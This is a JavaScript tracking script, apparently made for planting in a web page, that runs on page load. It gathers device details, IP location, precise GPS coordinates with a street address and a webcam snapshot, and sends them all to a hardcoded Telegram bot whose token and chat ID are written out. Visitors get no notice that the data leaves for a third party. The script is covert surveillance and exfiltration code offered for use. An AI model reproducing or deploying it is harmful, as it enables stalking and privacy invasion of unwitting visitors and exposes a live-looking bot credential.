// CONFIG BOT
const botToken = 7294492775:AAHFULvaNyhq_O_ovbrZxmV70o286CQ-9ZY;
const chatId = 7646758293;
const pageLoadStart = performance.now();

// Function kirim laporan text
function sendReport(locationData, gpsData = null) {
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const onlineStatus = navigator.onLine ? "Online" : "Offline";
    const screenSize = `${screen.width}x${screen.height}`;
    const windowSize = `${window.innerWidth}x${window.innerHeight}`;
    const deviceMemory = navigator.deviceMemory || "Unknown";
    const cpuCores = navigator.hardwareConcurrency || "Unknown";
    const accessTime = new Date().toString();
    const pageLoadTime = (performance.now() - pageLoadStart).toFixed(2);
    const historyLength = window.history.length;
    const touchSupport = "ontouchstart" in window ? "✅ YA" : "❌ TIDAK";
    const referrer = document.referrer || "None";
    const pageTitle = document.title;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const offset = new Date().getTimezoneOffset();

    const ip = locationData.ip || "N/A";
    const city = locationData.city || "N/A";
    const region = locationData.region || "N/A";
    const country = locationData.country_name || "N/A";
    const postal = locationData.postal || "N/A";
    const latitude = gpsData?.lat || locationData.latitude || "N/A";
    const longitude = gpsData?.lon || locationData.longitude || "N/A";
    const org = locationData.org || "N/A";
    const address = gpsData?.address || `${city}, ${region}, ${country}, ${postal}`;

    const message =
`╭───── Tracking Report ───── ⦿

⚙️ DEVICE INFORMATION
🖥️ Device: ${userAgent}
💻 Platform: ${platform}
🌐 Bahasa: ${language}
📶 Online: ${onlineStatus}
📺 Screen Size: ${screenSize}
🪟 Window Size: ${windowSize}
💾 RAM: ${deviceMemory} GB
🧠 CPU Cores: ${cpuCores}
⏰ Waktu Akses: ${accessTime}
🕒 Page Load Time: ${pageLoadTime} ms
📜 History Length: ${historyLength}
✋ Touch Support: ${touchSupport}
🔗 Referrer: ${referrer}
📄 Title: ${pageTitle}
🕓 Timezone: ${timezone}
🧭 Offset: ${offset} menit

📍 LOCATION INFORMATION
📡 IP Address: ${ip}
🏙️ Kota: ${city}
🗺️ Wilayah: ${region}
🌎 Negara: ${country}
🏷️ Kode Pos: ${postal}
📌 Latitude: ${latitude}
📍 Longitude: ${longitude}
📶 ISP: ${org}
🏠 Alamat Lengkap: ${address}

╰───── Telegram @putraModz ──── ⦿`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json; charset=UTF-8" },
        body: JSON.stringify({
            chat_id: chatId,
            text: message
        }),
    });
}

// Function ambil foto webcam dan kirim ke Telegram
function sendPhoto(caption) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;

    navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.addEventListener("loadeddata", () => {
            const canvas = document.createElement("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Stop webcam
            stream.getTracks().forEach(track => track.stop());

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append("chat_id", chatId);
                formData.append("caption", caption);
                formData.append("photo", blob, "tracking_photo.png");

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: "POST",
                    body: formData
                });
            }, "image/png");
        });
    })
    .catch(err => console.log("User tidak mengizinkan kamera atau error:", err));
}

// Function utama ambil IP + GPS + kirim report + foto
function sendToTelegram() {
    fetch("https://ipapi.co/json/")
    .then(res => res.json())
    .then(ipData => {
        navigator.geolocation.getCurrentPosition(
            pos => {
                const { latitude, longitude } = pos.coords;
                fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`)
                .then(res => res.json())
                .then(addrData => {
                    sendReport(ipData, {
                        lat: latitude,
                        lon: longitude,
                        address: addrData.display_name
                    });
                    sendPhoto("Tracking Report 📸");
                })
                .catch(() => {
                    sendReport(ipData);
                    sendPhoto("Tracking Report 📸");
                });
            },
            () => {
                sendReport(ipData);
                sendPhoto("Tracking Report 📸");
            },
            { enableHighAccuracy: true, timeout: 5000 }
        );
    });
}

window.onload = sendToTelegram;